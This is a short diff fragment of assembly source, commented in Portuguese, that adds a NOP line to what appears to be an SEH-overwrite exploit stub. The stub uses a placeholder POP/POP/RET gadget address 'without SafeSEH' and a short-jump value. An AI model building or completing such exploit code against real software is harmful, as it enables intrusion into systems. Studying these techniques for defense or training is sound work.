@@ -35,6 +35,7 @@ setup:
                                 ; 5C       POP ESP
                                 ; 58       POP EAX
                                 ; C3       RET
+                                ; 90       NOP
     PUSH 0x41414141             ; Substituir por um endereço de P/P/R sem SafeSEH  ** PLACEHOLDER **
     PUSH 0x04EB5858             ; SHORT JUMP
                                 ; Corresponde as instrucoes abaixo:
